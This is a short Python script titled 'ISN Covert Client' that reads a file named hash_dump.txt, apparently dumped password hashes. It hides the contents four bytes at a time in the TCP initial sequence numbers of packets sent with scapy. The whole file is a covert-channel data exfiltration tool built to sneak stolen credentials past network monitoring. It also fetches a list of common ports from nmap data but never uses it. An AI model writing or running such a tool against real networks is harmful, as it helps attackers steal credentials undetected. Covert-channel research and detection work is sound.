##########################################
#ISN Covert Client
##########################################
from os import popen
from struct import unpack
from scapy.all import *
def sender():
    with open('hash_dump.txt') as f:
        s=f.read()
    #print type(s)
    #print s
   
    payload = s
    print len(payload) 
    packetN = (len(payload) / 4) + 1
    print packetN
    port_list = popen("grep -v '#' /usr/share/nmap/nmap-services | sort -r -k3 | awk  '{print $2}' | cut -d/ -f1 | head -%s" % packetN).readlines()
    print port_list

    packets = []

    packet_est = len(payload)%4
    #payload += "\x00" * (4 - packetN)


    count = 0
    if len(payload)%4==0:
        limit = len(payload)/4
    else:
        limit = (len(payload)/4) + 1
        payload += "\x00" * (4 - packet_est)

    for i in range(0,limit):
        id_payload = payload[count:count+4]
        #i = i + 2
        tcp_isn = unpack("<I",id_payload)[0]
        pkt = IP()/ TCP(seq=tcp_isn)/ Raw("Covert Channel")
        send(pkt)
        #print i
        print id_payload
        count = count + 4
    print("Total packets sent:"+ str(i + 1))
sender()
